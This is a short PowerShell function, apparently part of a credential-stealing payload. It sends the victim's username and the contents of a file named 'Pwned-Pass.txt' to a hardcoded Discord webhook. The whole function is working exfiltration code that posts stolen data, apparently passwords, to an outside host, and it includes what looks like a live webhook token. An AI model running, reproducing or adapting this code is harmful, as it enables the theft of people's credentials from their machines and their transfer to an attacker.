function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'https://discord.com/api/webhooks/1210083286651633684/0H191fHnoEMot2mgMajlW0GtgNaJSpfWDjl6IRSWkvx269lv3p5aU-Jt8kOFQB80VcuS'
    $file = "Pwned-Pass.txt"  # Specify the file name here

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (Test-Path $file){
        $fileContent = Get-Content $file
        $Body['file1'] = $fileContent
        Invoke-RestMethod -Uri $hookurl -Method Post -Body $Body
    } else {
        Write-Host "File not found: $file"
    }
}
